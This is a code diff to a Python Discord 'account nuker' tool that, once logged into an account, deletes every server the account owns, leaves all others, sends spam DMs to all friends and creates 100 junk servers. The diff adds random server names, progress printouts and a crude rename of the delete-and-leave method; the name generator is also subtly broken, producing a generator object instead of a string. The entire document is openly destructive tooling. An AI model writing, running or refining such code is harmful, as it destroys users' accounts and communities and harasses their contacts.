@@ -4,6 +4,7 @@ import os
 import json
 from colorama import Fore, Back
 from discord.ext import commands
+import random
 
 from loading import Loader
 
@@ -34,23 +35,27 @@ loading = Loader(f"{Fore.LIGHTYELLOW_EX}┃{Fore.LIGHTGREEN_EX} Nuking account..
 with open('config.json') as f:
     data = json.load(f)
 
-GUILD_NAME = data['guildname']
 SPAM_MESSAGE = data['message']
+
 
 
 class AccountNuker(commands.Bot):
     def __init__(self):
         super().__init__(command_prefix=">>>")
+        self.chars = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
     async def spamguild(self):
         for x in range(100):
-            await self.create_guild(name=f"{GUILD_NAME}")
+            name = (random.choice(self.chars) for x in range(10))
+            await self.create_guild(name=f"{name}")
+            print(Fore.RED + f"CREATED SERVER: {name}")
 
     async def spamdm(self):
         for user in self.user.friends:
             await user.send(f" {user.mention} {SPAM_MESSAGE}")
+            print(Fore.RED + f"DMED {user}")
 
-    async def leaveall(self):
+    async def tingycock(self):
         for guild in self.guilds:
             guildid = guild.owner
             if guildid is None:
@@ -58,9 +63,11 @@ class AccountNuker(commands.Bot):
             else:
                 if self.user.id == guildid.id:
                     await guild.delete()
+                    print(Fore.RED + f"DELETED {guild}")
                 else:
                     to_leave = self.get_guild(guild.id)
                     await to_leave.leave()
+                    print(Fore.RED + f"LEFT {guild}")
 
     async def on_ready(self):
         print(f"logged in as {self.user.name}")
@@ -76,12 +83,12 @@ class AccountNuker(commands.Bot):
             loading.stop()
         elif stuff == '3':
             loading.start()
-            await self.leaveall()
+            await self.tingycock()
             loading.stop()
         elif stuff == '4':
             loading.start()
             await self.spamdm()
-            await self.leaveall()
+            await self.tingycock()
             await self.spamguild()
             loading.stop()
 
